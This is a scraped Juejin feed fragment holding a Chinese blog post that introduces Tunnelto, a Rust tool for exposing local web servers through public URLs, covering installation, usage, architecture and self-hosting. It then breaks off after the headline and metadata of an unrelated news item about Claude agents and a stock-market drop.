data-draft-id="7603221478473334826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一天一个开源项目（第13篇）：Tunnelto - 用Rust打造的高性能内网穿透工具"/> <meta itemprop="keywords" content="开源,前端,后端"/> <meta itemprop="datePublished" content="2026-02-05T12:00:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冬奇Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一天一个开源项目（第13篇）：Tunnelto - 用Rust打造的高性能内网穿透工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冬奇Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:00:54.000Z" title="Thu Feb 05 2026 12:00:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<blockquote>
<p>"如果只需要一条命令，就能让全世界的用户访问你本地运行的web服务器，那该多好？"</p>
</blockquote>
<p>这是"一天一个开源项目"系列的第13篇文章。今天带你了解的项目是 <strong>Tunnelto</strong>（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagrinman%2Ftunnelto" target="_blank" title="https://github.com/agrinman/tunnelto" ref="nofollow noopener noreferrer">GitHub</a>）。</p>
<p>在开发和测试web应用时，我们经常需要将本地服务暴露给外部访问，比如让远程同事测试、集成第三方webhook、或者演示给客户。传统的解决方案要么配置复杂，要么性能不佳，要么需要付费。Tunnelto用Rust打造，基于Tokio异步IO，提供了高性能、易用的内网穿透解决方案，让你用一条命令就能将本地服务暴露到互联网。</p>
<h3 data-id="heading-1">你将学到什么</h3>
<ul>
<li>Tunnelto的核心架构和技术特点</li>
<li>如何使用Tunnelto快速暴露本地服务</li>
<li>Rust异步IO在网络隧道中的应用</li>
<li>Tunnelto与其他内网穿透工具的对比</li>
<li>如何自托管Tunnelto服务器</li>
<li>Tunnelto的高级功能和配置选项</li>
<li>实际开发场景中的应用案例</li>
</ul>
<h3 data-id="heading-2">前置知识</h3>
<ul>
<li>对网络基础有基本了解（TCP/IP、HTTP）</li>
<li>了解本地开发服务器的概念</li>
<li>熟悉命令行工具的使用</li>
<li>对Rust有基本认识（可选，有助于理解实现原理）</li>
</ul>
<hr/>
<h2 data-id="heading-3">项目背景</h2>
<h3 data-id="heading-4">项目简介</h3>
<p><strong>Tunnelto</strong> 是一个用<strong>Rust编写的高性能内网穿透工具</strong>，让你能够通过一条简单的命令，将本地运行的web服务器暴露到互联网，获得一个公共可访问的URL。它完全基于异步IO（Tokio），性能优异，同时支持自定义子域名和自托管部署。</p>
<p><strong>项目解决的核心问题</strong>：</p>
<ul>
<li>本地开发服务无法被外部访问，影响协作和测试</li>
<li>传统内网穿透工具配置复杂、性能不佳</li>
<li>需要集成第三方服务（如OAuth回调、Webhook）时无法使用localhost</li>
<li>商业解决方案价格昂贵或有限制</li>
<li>需要自托管解决方案以保护隐私和数据安全</li>
</ul>
<p><strong>面向的用户群体</strong>：</p>
<ul>
<li>Web开发者和全栈工程师</li>
<li>需要快速演示和测试的开发者</li>
<li>需要集成第三方API的开发者</li>
<li>对性能和隐私有要求的开发者</li>
<li>需要自托管内网穿透服务的团队</li>
</ul>
<h3 data-id="heading-5">作者/团队介绍</h3>
<p><strong>作者：Alex Grinman (@agrinman)</strong></p>
<ul>
<li><strong>背景</strong>：专注于系统编程和网络技术的开发者</li>
<li><strong>项目创建时间</strong>：2020年</li>
<li><strong>理念</strong>：打造高性能、易用、可自托管的内网穿透工具</li>
<li><strong>技术栈</strong>：Rust、Tokio、异步IO</li>
</ul>
<h3 data-id="heading-6">项目数据</h3>
<ul>
<li>⭐ <strong>GitHub Stars</strong>: 5.7k+（持续增长）</li>
<li>🍴 <strong>Forks</strong>: 432+</li>
<li>📦 <strong>版本</strong>: 0.1.18（最新版本，2021年5月16日发布）</li>
<li>📄 <strong>License</strong>: MIT</li>
<li>🌐 <strong>官网</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Ftunnelto.dev" target="_blank" title="https://tunnelto.dev" ref="nofollow noopener noreferrer">tunnelto.dev</a></li>
<li>💬 <strong>社区</strong>: GitHub Issues活跃</li>
</ul>
<p><strong>项目发展历程</strong>：</p>
<ul>
<li>2020年：项目创建，发布初始版本</li>
<li>2020-2021年：持续优化，添加新功能</li>
<li>2021年5月：发布0.1.18版本，功能稳定</li>
<li>持续维护：项目持续活跃，社区贡献不断</li>
</ul>
<hr/>
<h2 data-id="heading-7">主要功能</h2>
<h3 data-id="heading-8">核心作用</h3>
<p>Tunnelto的核心作用是<strong>将本地运行的web服务器通过公共URL暴露到互联网</strong>，主要功能包括：</p>
<ol>
<li><strong>快速暴露本地服务</strong>：一条命令即可将本地端口映射到公共URL</li>
<li><strong>自定义子域名</strong>：支持指定自定义子域名，方便记忆和使用</li>
<li><strong>API认证</strong>：支持API密钥认证，保护隧道安全</li>
<li><strong>自托管支持</strong>：可以部署自己的Tunnelto服务器</li>
<li><strong>高性能</strong>：基于Rust和Tokio异步IO，性能优异</li>
<li><strong>本地仪表板</strong>：提供本地监控和调试界面</li>
</ol>
<h3 data-id="heading-9">使用场景</h3>
<ol>
<li>
<p><strong>Web开发测试</strong></p>
<ul>
<li>让远程团队成员访问本地开发环境</li>
<li>在移动设备上测试响应式设计</li>
<li>演示给客户或产品经理</li>
</ul>
</li>
<li>
<p><strong>第三方服务集成</strong></p>
<ul>
<li>OAuth回调URL配置（GitHub、Google等）</li>
<li>Webhook接收（Stripe、GitHub Actions等）</li>
<li>第三方API测试和调试</li>
</ul>
</li>
<li>
<p><strong>API开发和调试</strong></p>
<ul>
<li>让前端开发者访问本地API服务</li>
<li>测试移动应用与后端API的集成</li>
<li>调试跨域问题</li>
</ul>
</li>
<li>
<p><strong>临时演示和分享</strong></p>
<ul>
<li>快速分享本地项目给他人</li>
<li>临时演示和原型展示</li>
<li>无需部署即可展示功能</li>
</ul>
</li>
<li>
<p><strong>CI/CD集成</strong></p>
<ul>
<li>在CI环境中暴露测试服务</li>
<li>自动化测试中的服务访问</li>
<li>临时测试环境搭建</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">快速开始</h3>
<h4 data-id="heading-11">安装方式</h4>
<p><strong>macOS (Homebrew)</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">brew install agrinman/tap/tunnelto
</code></pre>
<p><strong>Cargo (Rust用户)</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">cargo install tunnelto
</code></pre>
<p><strong>其他平台</strong>:
从 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagrinman%2Ftunnelto%2Freleases" target="_blank" title="https://github.com/agrinman/tunnelto/releases" ref="nofollow noopener noreferrer">GitHub Releases</a> 下载对应平台的二进制文件。</p>
<h4 data-id="heading-12">最简单的使用示例</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 暴露本地8000端口的服务</span>
tunnelto --port 8000
</code></pre>
<p>运行后，你会看到类似这样的输出：</p>
<pre><code class="hljs language-arduino" lang="arduino">🚀 Starting tunnelto...
🌍 Public URL: https:<span class="hljs-comment">//abc123.tunnelto.dev</span>
📊 Dashboard: http:<span class="hljs-comment">//localhost:4040</span>
</code></pre>
<p>现在，任何人都可以通过 <code>https://abc123.tunnelto.dev</code> 访问你本地 <code>localhost:8000</code> 的服务。</p>
<h4 data-id="heading-13">自定义子域名</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用自定义子域名</span>
tunnelto --port 8000 --subdomain myapp
</code></pre>
<p>这样会生成 <code>https://myapp.tunnelto.dev</code> 的URL。</p>
<h4 data-id="heading-14">指定本地主机和协议</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 指定本地主机和协议</span>
tunnelto --port 3000 --host 127.0.0.1 --scheme https
</code></pre>
<h3 data-id="heading-15">核心特性</h3>
<ol>
<li>
<p><strong>极简使用</strong></p>
<ul>
<li>一条命令即可使用，无需复杂配置</li>
<li>自动生成公共URL，开箱即用</li>
<li>支持多种安装方式</li>
</ul>
</li>
<li>
<p><strong>高性能异步IO</strong></p>
<ul>
<li>基于Rust和Tokio，性能优异</li>
<li>异步处理，支持高并发连接</li>
<li>低延迟，响应迅速</li>
</ul>
</li>
<li>
<p><strong>自定义子域名</strong></p>
<ul>
<li>支持指定自定义子域名</li>
<li>方便记忆和使用</li>
<li>适合生产环境使用</li>
</ul>
</li>
<li>
<p><strong>API认证</strong></p>
<ul>
<li>支持API密钥认证</li>
<li>保护隧道安全</li>
<li>防止未授权访问</li>
</ul>
</li>
<li>
<p><strong>本地仪表板</strong></p>
<ul>
<li>提供本地监控界面</li>
<li>查看请求日志和统计</li>
<li>方便调试和监控</li>
</ul>
</li>
<li>
<p><strong>自托管支持</strong></p>
<ul>
<li>可以部署自己的服务器</li>
<li>完全控制数据和隐私</li>
<li>支持分布式部署（使用Fly.io）</li>
</ul>
</li>
<li>
<p><strong>多协议支持</strong></p>
<ul>
<li>支持HTTP和HTTPS</li>
<li>自动处理协议转换</li>
<li>灵活配置</li>
</ul>
</li>
<li>
<p><strong>跨平台</strong></p>
<ul>
<li>支持macOS、Linux、Windows</li>
<li>提供多种安装方式</li>
<li>统一的命令行接口</li>
</ul>
</li>
</ol>
<h3 data-id="heading-16">项目优势</h3>





















































<table><thead><tr><th align="left">对比项</th><th align="left">Tunnelto</th><th align="left">ngrok</th><th align="left">localtunnel</th></tr></thead><tbody><tr><td align="left"><strong>性能</strong></td><td align="left">⭐⭐⭐⭐⭐ Rust异步IO</td><td align="left">⭐⭐⭐⭐ Go实现</td><td align="left">⭐⭐⭐ Node.js</td></tr><tr><td align="left"><strong>易用性</strong></td><td align="left">⭐⭐⭐⭐⭐ 一条命令</td><td align="left">⭐⭐⭐⭐ 简单</td><td align="left">⭐⭐⭐⭐ 简单</td></tr><tr><td align="left"><strong>自托管</strong></td><td align="left">✅ 完全支持</td><td align="left">❌ 需要付费</td><td align="left">✅ 支持但功能有限</td></tr><tr><td align="left"><strong>自定义域名</strong></td><td align="left">✅ 免费支持</td><td align="left">❌ 需要付费</td><td align="left">❌ 不支持</td></tr><tr><td align="left"><strong>开源</strong></td><td align="left">✅ MIT</td><td align="left">❌ 部分开源</td><td align="left">✅ MIT</td></tr><tr><td align="left"><strong>资源占用</strong></td><td align="left">⭐⭐⭐⭐⭐ 极低</td><td align="left">⭐⭐⭐⭐ 较低</td><td align="left">⭐⭐⭐ 中等</td></tr><tr><td align="left"><strong>社区活跃度</strong></td><td align="left">⭐⭐⭐⭐ 活跃</td><td align="left">⭐⭐⭐⭐⭐ 非常活跃</td><td align="left">⭐⭐⭐ 一般</td></tr></tbody></table>
<p><strong>为什么选择Tunnelto？</strong></p>
<ul>
<li><strong>性能优异</strong>：Rust和Tokio的组合带来极佳性能，适合高并发场景</li>
<li><strong>完全开源</strong>：MIT许可证，代码完全开放，可自由使用和修改</li>
<li><strong>自托管友好</strong>：提供完整的自托管方案，保护隐私和数据安全</li>
<li><strong>简单易用</strong>：一条命令即可使用，学习成本低</li>
<li><strong>资源占用低</strong>：Rust编译的二进制文件体积小，运行时占用资源少</li>
<li><strong>活跃维护</strong>：项目持续更新，社区活跃</li>
</ul>
<hr/>
<h2 data-id="heading-17">项目详细剖析</h2>
<h3 data-id="heading-18">架构设计</h3>
<p>Tunnelto采用<strong>客户端-服务器架构</strong>，包含三个核心组件：</p>
<ol>
<li><strong>Tunnelto Client</strong>：运行在用户本地的客户端，负责建立隧道</li>
<li><strong>Tunnelto Server</strong>：运行在云端的服务器，负责转发流量</li>
<li><strong>Control WebSocket</strong>：客户端和服务器之间的控制通道</li>
</ol>
<h4 data-id="heading-19">核心模块</h4>
<pre><code class="hljs language-arduino" lang="arduino">┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Browser   │────────▶│ Tunnelto     │────────▶│   Local     │
│  (Internet)  │         │   <span class="hljs-built_in">Server</span>     │         │   <span class="hljs-built_in">Server</span>    │
└─────────────┘         └──────────────┘         └─────────────┘
                              ▲
                              │ Control WebSocket
                              │
                        ┌─────────────┐
                        │   <span class="hljs-built_in">Client</span>    │
                        │  (Local)    │
                        └─────────────┘
</code></pre>
<p><strong>工作流程</strong>：</p>
<ol>
<li><strong>建立控制连接</strong>：客户端通过WebSocket连接到服务器，建立控制通道</li>
<li><strong>注册隧道</strong>：客户端向服务器注册隧道，获得公共URL</li>
<li><strong>流量转发</strong>：当有请求到达公共URL时，服务器通过控制通道通知客户端</li>
<li><strong>建立数据连接</strong>：客户端建立到本地服务的连接</li>
<li><strong>双向转发</strong>：服务器和客户端双向转发HTTP请求和响应</li>
</ol>
<h3 data-id="heading-20">关键实现</h3>
<h4 data-id="heading-21">异步IO架构</h4>
<p>Tunnelto完全基于<strong>Tokio异步运行时</strong>，充分利用Rust的异步特性：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 伪代码示例：核心异步处理逻辑</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">handle_tunnel_connection</span>(stream: TcpStream) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;()&gt; {
    <span class="hljs-comment">// 异步处理TCP连接</span>
    <span class="hljs-keyword">let</span> (reader, writer) = stream.<span class="hljs-title function_ invoke__">split</span>();
    
    <span class="hljs-comment">// 异步读取和写入</span>
    tokio::<span class="hljs-title function_ invoke__">spawn</span>(<span class="hljs-keyword">async</span> <span class="hljs-keyword">move</span> {
        <span class="hljs-comment">// 处理数据转发</span>
    });
    
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<p><strong>优势</strong>：</p>
<ul>
<li><strong>高并发</strong>：单线程可处理大量并发连接</li>
<li><strong>低延迟</strong>：异步IO避免线程切换开销</li>
<li><strong>资源高效</strong>：相比传统多线程模型，资源占用更低</li>
</ul>
<h4 data-id="heading-22">隧道管理</h4>
<p>Tunnelto使用<strong>子域名路由</strong>来管理多个隧道：</p>
<ul>
<li>每个隧道分配一个唯一的子域名</li>
<li>服务器根据Host头路由到对应的隧道</li>
<li>支持自定义子域名，方便记忆和使用</li>
</ul>
<h4 data-id="heading-23">自托管实现</h4>
<p>Tunnelto提供了完整的自托管方案：</p>
<p><strong>单实例部署</strong>：</p>
<ul>
<li>编译musl目标（静态链接）</li>
<li>使用Docker部署</li>
<li>配置环境变量</li>
</ul>
<p><strong>分布式部署</strong>（官方方案）：</p>
<ul>
<li>使用Fly.io的Private Networking</li>
<li>实现Gossip协议进行服务发现</li>
<li>支持多实例负载均衡</li>
</ul>
<p><strong>关键配置</strong>（<code>tunnelto_server/src/config.rs</code>）：</p>
<ul>
<li><code>ALLOWED_HOSTS</code>：允许的主机名</li>
<li><code>CTRL_HOST</code>：控制服务器地址</li>
<li><code>CTRL_PORT</code>：控制服务器端口</li>
<li><code>CTRL_TLS_OFF</code>：是否禁用TLS（用于本地测试）</li>
</ul>
<h3 data-id="heading-24">安全机制</h3>
<ol>
<li>
<p><strong>API密钥认证</strong></p>
<ul>
<li>支持设置API密钥</li>
<li>防止未授权访问</li>
<li>保护隧道安全</li>
</ul>
</li>
<li>
<p><strong>TLS加密</strong></p>
<ul>
<li>默认使用HTTPS</li>
<li>端到端加密</li>
<li>保护数据传输安全</li>
</ul>
</li>
<li>
<p><strong>访问控制</strong></p>
<ul>
<li>支持配置允许的主机名</li>
<li>防止域名劫持</li>
<li>增强安全性</li>
</ul>
</li>
</ol>
<h3 data-id="heading-25">性能优化</h3>
<ol>
<li>
<p><strong>零拷贝技术</strong></p>
<ul>
<li>Rust的所有权系统避免不必要的内存拷贝</li>
<li>提高数据传输效率</li>
</ul>
</li>
<li>
<p><strong>连接池管理</strong></p>
<ul>
<li>复用TCP连接</li>
<li>减少连接建立开销</li>
</ul>
</li>
<li>
<p><strong>异步批处理</strong></p>
<ul>
<li>批量处理请求</li>
<li>提高吞吐量</li>
</ul>
</li>
</ol>
<h3 data-id="heading-26">扩展机制</h3>
<p>虽然Tunnelto本身功能相对简单，但提供了良好的扩展性：</p>
<ol>
<li>
<p><strong>自定义服务器</strong></p>
<ul>
<li>可以修改服务器代码</li>
<li>添加自定义功能</li>
<li>集成到现有系统</li>
</ul>
</li>
<li>
<p><strong>环境变量配置</strong></p>
<ul>
<li>通过环境变量灵活配置</li>
<li>支持不同部署场景</li>
<li>易于集成到CI/CD</li>
</ul>
</li>
<li>
<p><strong>API接口</strong></p>
<ul>
<li>控制WebSocket协议开放</li>
<li>可以开发自定义客户端</li>
<li>集成到其他工具</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-27">项目地址与资源</h2>
<h3 data-id="heading-28">官方资源</h3>
<ul>
<li>🌟 <strong>GitHub</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagrinman%2Ftunnelto" target="_blank" title="https://github.com/agrinman/tunnelto" ref="nofollow noopener noreferrer">github.com/agrinman/tu…</a></li>
<li>📚 <strong>文档</strong>: GitHub README包含完整使用指南</li>
<li>🌐 <strong>官网</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Ftunnelto.dev" target="_blank" title="https://tunnelto.dev" ref="nofollow noopener noreferrer">tunnelto.dev</a></li>
</ul>
<h3 data-id="heading-29">适用人群</h3>
<p><strong>Tunnelto特别适合以下开发者</strong>：</p>
<ol>
<li>
<p><strong>Web开发者</strong></p>
<ul>
<li>需要快速暴露本地服务进行测试</li>
<li>需要集成第三方服务（OAuth、Webhook）</li>
<li>需要演示和分享本地项目</li>
</ul>
</li>
<li>
<p><strong>全栈工程师</strong></p>
<ul>
<li>需要让前端访问本地API</li>
<li>需要测试移动应用与后端集成</li>
<li>需要调试跨域问题</li>
</ul>
</li>
<li>
<p><strong>DevOps工程师</strong></p>
<ul>
<li>需要自托管内网穿透服务</li>
<li>需要集成到CI/CD流程</li>
<li>对性能和安全性有要求</li>
</ul>
</li>
<li>
<p><strong>Rust开发者</strong></p>
<ul>
<li>想学习Rust异步IO实践</li>
<li>想了解网络编程最佳实践</li>
<li>想贡献开源项目</li>
</ul>
</li>
<li>
<p><strong>对隐私有要求的开发者</strong></p>
<ul>
<li>不想使用第三方商业服务</li>
<li>需要完全控制数据</li>
<li>需要自托管解决方案</li>
</ul>
</li>
</ol>
<hr/>
<p><em>欢迎来我中的<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">个人主页</a>找到更多有用的知识和有趣的产品</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[昨夜，Claude智能体压垮华尔街，近万亿刀市值蒸发]]></title>    <link>https://juejin.cn/post/7602931486598414371</link>    <guid>https://juejin.cn/post/7602931486598414371</guid>    <pubDate>2026-02-05T10:03:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602931486598414371" data-draft-id="7603043152672653327" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="昨夜，Claude智能体压垮华尔街，近万亿刀市值蒸发"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2026-02-05T10:03:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="机器之心"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            昨夜，Claude智能体压垮华尔街，近万亿刀市值蒸发
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    机器之心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:03:53.000Z" title="Thu Feb 05 2026 10:03:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body 